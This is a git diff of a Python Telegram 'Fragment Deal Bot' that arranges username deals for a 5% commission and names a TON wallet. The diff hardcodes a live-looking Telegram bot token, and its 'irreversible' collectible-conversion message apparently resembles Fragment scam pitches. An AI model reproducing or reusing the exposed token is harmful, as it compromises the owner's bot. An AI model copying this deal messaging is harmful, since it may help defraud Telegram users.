@@ -27,7 +27,7 @@ logger = logging.getLogger(__name__)
 USERNAME_INPUT, PRICE_INPUT, CONFIRMATION = range(3)
 
 # Configuration
-BOT_TOKEN = ""  # Remplacez par votre token
+BOT_TOKEN = "7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c"  # Remplacez par votre token
 WEBAPP_URL = "https://myminiapp.onrender.com"  # URL de votre mini app
 
 class FragmentDealBot:
@@ -301,7 +301,6 @@ Please note that a 5% commission is charged to the seller prior to accepting the
 • Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U ([View](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U))
 
 **Important:**
-
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message.
         """
@@ -337,7 +336,6 @@ Please note that a 5% commission is charged to the seller prior to accepting the
         self.application.add_error_handler(self.error_handler)
         
         print("🚀 Fragment Deal Bot démarré...")
-        print("💎 Mode: TON uniquement")
         print("🎯 Fonctionnalités:")
         print("   • Création de deals Fragment")
         print("   • Calcul automatique des commissions (5%)")
